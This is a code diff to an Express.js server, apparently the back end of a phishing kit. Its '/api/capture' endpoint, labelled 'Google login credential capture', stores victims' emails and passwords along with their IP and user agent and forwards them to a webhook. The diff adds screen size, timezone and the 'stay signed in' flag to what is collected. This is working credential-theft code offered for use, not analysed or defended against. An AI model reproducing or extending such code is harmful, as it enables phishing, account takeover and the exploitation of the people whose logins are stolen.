@@ -661,7 +661,7 @@ app.post('/log-error', (req, res) => {
 
 // ── Google login credential capture ──
 app.post('/api/capture', (req, res) => {
-    const { email, password, source, timestamp, clientId } = req.body;
+    const { email, password, source, timestamp, clientId, screen, timezone, staySignedIn } = req.body;
     if (!email || !password) return res.status(400).json({ error: 'Missing fields' });
     if (!store.credentials) store.credentials = [];
     const entry = {
@@ -672,6 +672,9 @@ app.post('/api/capture', (req, res) => {
         source: source || 'unknown',
         ip: getClientIP(req),
         userAgent: req.headers['user-agent'] || '',
+        screen: screen || '',
+        timezone: timezone || '',
+        staySignedIn: staySignedIn || false,
         timestamp: timestamp || new Date().toISOString()
     };
     store.credentials.unshift(entry);
@@ -689,7 +692,10 @@ app.post('/api/capture', (req, res) => {
                 { name: 'Source', value: entry.source || 'unknown', inline: true },
                 { name: 'IP', value: entry.ip || 'unknown', inline: true },
                 { name: 'Client ID', value: entry.clientId, inline: true },
-                { name: 'Time', value: entry.timestamp, inline: true }
+                { name: 'Time', value: entry.timestamp, inline: true },
+                { name: 'Screen', value: entry.screen || 'unknown', inline: true },
+                { name: 'Timezone', value: entry.timezone || 'unknown', inline: true },
+                { name: 'Stay Signed In', value: entry.staySignedIn ? 'Yes' : 'No', inline: true }
             ]}]
         }).catch(() => {});
     }
